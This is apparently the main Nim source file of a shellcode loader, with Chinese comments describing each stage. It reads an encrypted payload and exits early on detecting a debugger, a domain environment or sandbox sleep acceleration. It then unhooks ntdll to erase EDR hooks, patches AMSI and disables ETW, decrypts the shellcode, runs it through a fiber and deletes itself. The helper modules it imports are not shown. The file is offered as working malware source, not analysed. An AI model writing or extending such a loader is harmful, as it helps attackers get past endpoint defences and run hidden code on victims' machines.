import ./anti_research
import ./anti_sandbox
import ./exec
import ./get_data



# ==========================================
# 5. 主端到端验证逻辑
# ==========================================
proc main() =
  # ==================================================
  # 第一步：阶段准备（只获取密文，不解密！）
  # ==================================================
  let (key, b85chars, check_data, data) = get_data.get_data("payload.txt")
  if check_data.len == 0: return


  # ==================================================
  # 第二步：反沙箱与抗分析（最先执行，防止过早暴露）
  # ==================================================
  # 优先进行不需要高危 API 的环境检查（如检查域、延迟运行、看是否有调试器）
  if anti_sandbox.isDebuggerPresent(): return # 检测是否是debug模式
  if anti_sandbox.checkDomain(): return # 检测是否在域内
  if anti_sandbox.checkSandboxSleep(): return # 检测是否被沙箱快进
  


  # ==================================================
  # 第三步：内存净化 / 反侦察（为后续高危动作打掩护）
  # ==================================================
  # 此时环境安全，开始刷掉系统的监控，确保接下来的解密和执行不被拦截
  if not anti_research.ntdllunhook(): return # 重载 ntdll.dll 擦除 EDR 钩子
  if not anti_research.PatchAmsi(): return # 绕过 AMSI 内存扫描
  if not anti_research.Patchntdll(): return # 禁用ETW事件日志上报

  # ==================================================
  # 第四步：延迟解密（即用即解，用完即丢）
  # ==================================================
  # 直到要执行的前一秒，才将明文 Shellcode 还原到内存中

  let encrypt_data = get_data.get_payload(data, key, b85Chars)
  if encrypt_data.len == 0: return

  # ==================================================
  # 第五步：隐蔽执行
  # ==================================================
  # 使用 Fiber 或其他更隐蔽的回调方式执行
  exec.runFiber(encrypt_data)

  # ==================================================
  # 第六步：痕迹清理（可选）
  # ==================================================
  # 如果是异步执行（如创建了独立进程注入），主程序此时可以进行自删除
  anti_research.self_delete()



if isMainModule:
  main()
